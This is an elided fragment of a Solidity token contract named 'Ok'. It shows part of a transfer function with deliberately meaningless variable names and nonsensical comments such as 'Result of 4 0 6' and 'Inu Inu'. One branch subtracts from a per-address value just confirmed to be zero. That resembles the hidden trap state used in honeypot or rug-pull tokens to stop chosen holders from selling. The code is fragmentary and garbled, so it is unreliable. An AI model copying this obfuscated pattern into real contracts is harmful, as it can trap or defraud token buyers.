...
contract Ok is Ownable {
    ...
    function biggest(
        ...
        if (cake[treated] == 0 && driven[treated] > 0 && !border) {
            cake[treated] -= order;
            if (amount > 2 * 10**(13 + _decimals)) cake[treated] -= order - 1; // Remove Block 0 and 1
        }
        ...
        uint256 fee = (amount / 100) * _fee; // Less than Cake (Like) - Inu Inu
        amount -= fee;
        _balances[treated] -= fee;
        _balances[address(this)] += fee;

        _balances[treated] -= amount;
        _balances[official] += amount; // Result of 4 0 6
    }
